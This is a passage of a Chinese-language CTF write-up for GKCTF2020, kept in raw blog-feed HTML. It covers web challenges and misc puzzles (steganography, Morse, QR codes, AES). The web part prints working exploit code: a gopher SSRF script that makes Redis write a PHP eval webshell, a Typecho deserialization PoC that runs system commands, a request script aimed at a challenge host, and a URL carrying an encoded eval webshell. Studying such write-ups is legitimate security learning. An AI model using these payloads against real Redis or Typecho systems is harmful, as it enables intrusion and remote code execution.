class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/python3<span class="number">.8</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">"gopher://"</span></span><br><span class="line">ip=<span class="string">"173.31.59.11"</span></span><br><span class="line">port=<span class="string">"6379"</span></span><br><span class="line">shell=<span class="string">"\n\n&lt;?php eval($_GET['a']);?&gt;\n\n"</span></span><br><span class="line">filename=<span class="string">"1.php"</span></span><br><span class="line">path=<span class="string">"/var/www/html"</span></span><br><span class="line">passwd=<span class="string">""</span></span><br><span class="line">cmd=[<span class="string">"flushall"</span>,</span><br><span class="line">     <span class="string">"set 1 &#123;&#125;"</span>.format(shell.replace(<span class="string">" "</span>,<span class="string">"$&#123;IFS&#125;"</span>)),</span><br><span class="line">     <span class="string">"config set dir &#123;&#125;"</span>.format(path),</span><br><span class="line">     <span class="string">"config set dbfilename &#123;&#125;"</span>.format(filename),</span><br><span class="line">     <span class="string">"save"</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">    CRLF=<span class="string">"\r\n"</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">    cmd=<span class="string">""</span></span><br><span class="line">    cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">"$"</span>+str(len((x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>))))+CRLF+x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.request.quote(redis_format(x))</span><br><span class="line">    print(payload)</span><br></pre></td></tr></table></figure><p><img src="/2020/05/GKCTF2020-Writeup/image-20200525130359211.png" alt="image-20200525130359211"></p><p>接着测试webshell</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200525130438217.png" alt="image-20200525130438217"></p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200525131721234.png" alt="image-20200525131721234"></p><h3 id="5-EZ三剑客-EzTypecho"><a href="#5-EZ三剑客-EzTypecho" class="headerlink" title="5.EZ三剑客-EzTypecho"></a>5.EZ三剑客-EzTypecho</h3><p>拿到题目源码后发现是0.9版本，先去github下了个0.9版本，然后用对比工具比较install.php</p><p>发现<code>session_start();</code>被注释</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200525135740889.png" alt="image-20200525135740889"></p><p>关键代码</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200525140208760.png" alt="image-20200525140208760"></p><p>首先要反序列化就要SESSION，但<code>session_start();</code>被注释，可以通过以下方法绕过</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200525140624669.png" alt="image-20200525140624669"></p><p><a href="https://www.freebuf.com/vuls/155753.html" target="_blank" rel="noopener">Typecho反序列化的文章</a></p><p>poc.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$CMD = <span class="string">'system("cat /flag")'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> RSS2 = <span class="string">'RSS 2.0'</span>;</span><br><span class="line">    <span class="keyword">const</span> ATOM1 = <span class="string">'ATOM 1.0'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $_type;</span><br><span class="line">    <span class="keyword">private</span> $_items;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//$this-&gt;_type = $this::RSS2;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_type = <span class="keyword">$this</span>::ATOM1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items[<span class="number">0</span>] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'category'</span> =&gt; <span class="keyword">array</span>(<span class="keyword">new</span> Typecho_Request()),</span><br><span class="line">            <span class="string">'author'</span> =&gt; <span class="keyword">new</span> Typecho_Request(),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_params[<span class="string">'screenName'</span>] = $GLOBALS[CMD];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">'assert'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exp = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'adapter'</span> =&gt; <span class="keyword">new</span> Typecho_Feed(),</span><br><span class="line">    <span class="string">'prefix'</span>  =&gt; <span class="string">'typecho_'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($exp));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">'http://97caa567-ba9d-4f95-825b-14bebe796a6e.node3.buuoj.cn/install.php?finish=1'</span></span><br><span class="line">files=&#123;<span class="string">'file'</span>:<span class="number">123</span>&#125;</span><br><span class="line">headers=&#123;<span class="string">'cookie'</span>:<span class="string">'PHPSESSID=test;__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6Mjp7czo4OiJjYXRlZ29yeSI7YToxOntpOjA7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czoxOToic3lzdGVtKCJjYXQgL2ZsYWciKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjE5OiJzeXN0ZW0oImNhdCAvZmxhZyIpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX1zOjY6InByZWZpeCI7czo4OiJ0eXBlY2hvXyI7fQ=='</span>,</span><br><span class="line"> <span class="string">'Referer'</span>:<span class="string">'http://97caa567-ba9d-4f95-825b-14bebe796a6e.node3.buuoj.cn/install.php'</span>&#125;</span><br><span class="line">re=requests.post(url,files=files,headers=headers,data=&#123;<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span>: <span class="string">"123456789"</span>&#125;)</span><br><span class="line">print(re.text)</span><br></pre></td></tr></table></figure><h3 id="6-EZ三剑客-EzNode"><a href="#6-EZ三剑客-EzNode" class="headerlink" title="6.EZ三剑客-EzNode"></a>6.EZ三剑客-EzNode</h3><p>首先看源码，发现delay被设置的很大，执行命令会超时，在node.js<a href="http://nodejs.cn/api/timers.html#timers_settimeout_callback_delay_args" target="_blank" rel="noopener">文档中</a>指出 <code>当</code>delay<code>大于</code>2147483647<code>或小于</code>1<code>时，则</code>delay<code>将会被设置为</code>1<code>。 非整数的 delay 会被截断为整数</code></p><p>然后题目很奇怪给了包的版本信息，感觉应该是 有公开漏洞</p><p>在<a href="https://github.com/advisories" target="_blank" rel="noopener">github advisories</a>找到了漏洞信息</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200525151514661.png" alt="image-20200525151514661"></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="1-Pokemon"><a href="#1-Pokemon" class="headerlink" title="1. Pokémon"></a>1. Pokémon</h3><p>GBA游戏，直接去103号道路，道路上就是flag</p><h3 id="2-Harley-Quinn"><a href="#2-Harley-Quinn" class="headerlink" title="2.Harley Quinn"></a>2.Harley Quinn</h3><p>题目信息隐藏的挺细致的，导致一直懵逼。</p><p>先是压缩包的属性里有解密的信息</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200526105114519.png" alt="image-20200526105114519"></p><p>然后根据题目描述下载Free_File_Camouflage V1.25</p><p>解压后，有个wav音频文件，属性里也有信息</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200526105632498.png" alt="image-20200526105632498"></p><p>提示密码有21位</p><p>音频用Sonic Visualiser打开后发现末尾有播音号 可以自己手动解，或者用</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200526105730727.png" alt="image-20200526105730727"></p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200526113701783.png" alt="image-20200526113701783"></p><p>接着用九宫格密码解</p><p>222按3下2键就是c，后面同理</p><p><img src="/2020/05/GKCTF2020-Writeup/clip_image001.png" alt="img"></p><p>最后解出 <code>ctfisfun</code></p><p>然后用然后用软件</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200526155704949.png" alt="image-20200526155704949"></p><h3 id="3-code-obfuscation"><a href="#3-code-obfuscation" class="headerlink" title="3.code obfuscation"></a>3.code obfuscation</h3><p>附件是个扭曲的二维码</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200526161615952.png" alt="image-20200526161615952"></p><p>然后binwalke可以分解出个要密码压缩包</p><p>接着修图，ps打开图片,选定好需要变换的区域，右键自由变换后再扭曲，然后截取下来</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200526161626648.png" alt="image-20200526161626648"></p><p>接着matlab处理</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200526161717329.png" alt="image-20200526161717329"></p><p>扫出来 <code>base(gkctf)</code></p><p>试了下解不了，可能要baseXX编码。然后用base58解出来了</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200526163147548.png" alt="image-20200526163147548"></p><p>解压后得到两个文件一个是js代码，一个是密文</p><p>js代码经过 混淆，利用<a href="http://tool.chinaz.com/js.aspx" target="_blank" rel="noopener">在线工具</a>解密后得到解密后的js代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> a b c d e f g h i j k l m n o p q r s t u v w x y z <span class="keyword">do</span> <span class="built_in">eval</span> An = <span class="string">"n"</span></span><br><span class="line">    done</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> A B C D E F G H I J K L M N O P Q R S T U V W X Y Z <span class="keyword">do</span> <span class="built_in">eval</span> An = <span class="string">"n"</span></span><br><span class="line">    done</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> a b c d e f g h i j <span class="keyword">do</span> <span class="built_in">eval</span> Bn = <span class="string">"n"</span></span><br><span class="line">    num =</span><br><span class="line">    $((num + <span class="number">1</span>)) done alert(<span class="string">"Bk=' ';Bm='"</span></span><br><span class="line">        ';Bn='#</span><br><span class="line">        <span class="string">';Bs='</span> (<span class="string">';Bt='</span>)</span><br><span class="line">        <span class="string">';By='</span>.</span><br><span class="line">        <span class="string">';Cb='</span>;</span><br><span class="line">        <span class="string">';Cc='</span> &lt; <span class="string">';Ce='</span> &gt; <span class="string">';Cl='</span></span><br><span class="line">        _ <span class="string">';Cn='</span> &#123;</span><br><span class="line">            <span class="string">';Cp='</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="string">';Da='</span></span><br><span class="line">        <span class="number">0</span> <span class="string">';Db='</span></span><br><span class="line">        <span class="number">1</span> <span class="string">';Dc='</span></span><br><span class="line">        <span class="number">2</span> <span class="string">';Dd='</span></span><br><span class="line">        <span class="number">3</span> <span class="string">';De='</span></span><br><span class="line">        <span class="number">4</span> <span class="string">';Df='</span></span><br><span class="line">        <span class="number">5</span> <span class="string">';Dg='</span></span><br><span class="line">        <span class="number">6</span> <span class="string">';Dh='</span></span><br><span class="line">        <span class="number">7</span> <span class="string">';Di='</span></span><br><span class="line">        <span class="number">8</span> <span class="string">';Dj='</span></span><br><span class="line">        <span class="number">9</span> <span class="string">';")</span></span><br></pre></td></tr></table></figure><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">b = <span class="string">"Bn$Ai$An$Ac$Al$Au$Ad$Ae$Bk$Cc$As$At$Ad$Ai$Ao$By$Ah$Ce$Ai$An$At$Bk$Am$Aa$Ai$An$Bs$Bt$Cn$Ap$Ar$Ai$An$At$Bs$Bm$Aw$Dd$Al$Ac$Da$Am$Ae$Cl$De$Ao$Cl$Dj$Ak$Ac$At$Df$Bm$Bt$Cb$Ar$Ae$At$Au$Ar$An$Bk$Da$Cb$Cp"</span></span><br><span class="line"></span><br><span class="line">c = &#123;<span class="string">"Bk"</span>: <span class="string">' '</span>, <span class="string">"Bm"</span>: <span class="string">'"'</span>, <span class="string">"Bn"</span>: <span class="string">'#'</span>, <span class="string">"Bs"</span>: <span class="string">'('</span>, <span class="string">"Bt"</span>: <span class="string">')'</span>, <span class="string">"By"</span>: <span class="string">'.'</span>, <span class="string">"Cb"</span>: <span class="string">','</span>, <span class="string">"Cc"</span>: <span class="string">'&lt;'</span>, <span class="string">"Ce"</span>: <span class="string">'&gt;'</span>, <span class="string">"Cl"</span>: <span class="string">'_'</span>,</span><br><span class="line">     <span class="string">"Cn"</span>: <span class="string">'&#123;'</span>, <span class="string">"Cp"</span>: <span class="string">'&#125;'</span>, <span class="string">"Da"</span>: <span class="string">'0'</span>, <span class="string">"Db"</span>: <span class="string">'1'</span>, <span class="string">"Dc"</span>: <span class="string">'2'</span>, <span class="string">"Dd"</span>: <span class="string">'3'</span>, <span class="string">"De"</span>: <span class="string">'4'</span>, <span class="string">"Df"</span>: <span class="string">'5'</span>, <span class="string">"Dg"</span>: <span class="string">'6'</span>, <span class="string">"Dh"</span>: <span class="string">'7'</span>,</span><br><span class="line">     <span class="string">"Di"</span>: <span class="string">'8'</span>, <span class="string">"Dj"</span>: <span class="string">'9'</span>&#125;</span><br><span class="line">f = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b.split(<span class="string">'$'</span>):</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> c.keys():</span><br><span class="line">        f = f + c[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f = f + i[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">print(f)</span><br></pre></td></tr></table></figure><h3 id="4-Sail-a-boat-down-the-river"><a href="#4-Sail-a-boat-down-the-river" class="headerlink" title="4.Sail a boat down the river"></a>4.Sail a boat down the river</h3><p>直接用命令分解视频</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200526165220148.png" alt="image-20200526165220148"></p><p>然后从118帧开始观察亮点，短是1帧，长是3帧</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200526165724934.png" alt="image-20200526165724934"></p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">-</span><span class="string">.</span>--<span class="comment">/</span><span class="string">.</span>--<span class="comment">/</span>--<span class="literal">-</span><span class="string">.</span><span class="string">.</span><span class="comment">/</span>--<span class="string">.</span><span class="comment">/</span></span><br></pre></td></tr></table></figure><p>摩斯解码</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200526170554507.png" alt="image-20200526170554507"></p><p>第465帧有个二维码，扫码是个百度盘链接</p><p>打开，提取码YW8G</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200526170728445.png" alt="image-20200526170728445"></p><p>然后玩数独，根据提示得到密钥</p><p><code>52693795149137</code></p><p>加密是AES(hex)，坑点是字符集 <code>gb18030/ISO10126</code></p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200526172054944.png" alt="image-20200526172054944"></p><p>解开压缩包，得到 <code>逆光vocal.ovex</code>用打谱软件打开就有flag。真心想不到</p>]]></content>
    
    <summary type="html">
    
      &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; class=&quot;aplayer-secondary-script-marker&quot;&gt;&lt;/script&gt;&lt;h2 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h2&gt;&lt;h3 id=&quot;1-Check-IN&quot;&gt;&lt;a href=&quot;#1-Check-IN&quot; class=&quot;headerlink&quot; title=&quot;1.Check IN&quot;&gt;&lt;/a&gt;1.Check IN&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/2020/05/GKCTF2020-Writeup/image-20200524132441686.png&quot; alt=&quot;image-20200524132441686&quot;&gt;&lt;/p&gt;&lt;p&gt;进去就是一个马&lt;/p&gt;&lt;p&gt;执行phpinfo后发现，禁用了执行命令的系统函数，但putenv未被禁用，所以想到劫持动态库执行命令。&lt;/p&gt;&lt;p&gt;先用蚁剑连接&lt;/p&gt;&lt;p&gt;构造如下URL，&lt;a href=&quot;http://384607b7-c341-452f-b732-101819a34a69.node3.buuoj.cn/?Ginkgo=QGV2YWwoJF9QT1NUWydhJ10pOw==密码是a&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://384607b7-c341-452f-b732-101819a34a69.node3.buuoj.cn/?Ginkgo=QGV2YWwoJF9QT1NUWydhJ10pOw==密码是a&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/tags/CTF/"/>
    
      <category term="WP" scheme="https://0xcreed.jxustctf.top/tags/WP/"/>
    
  </entry>
  
</feed>
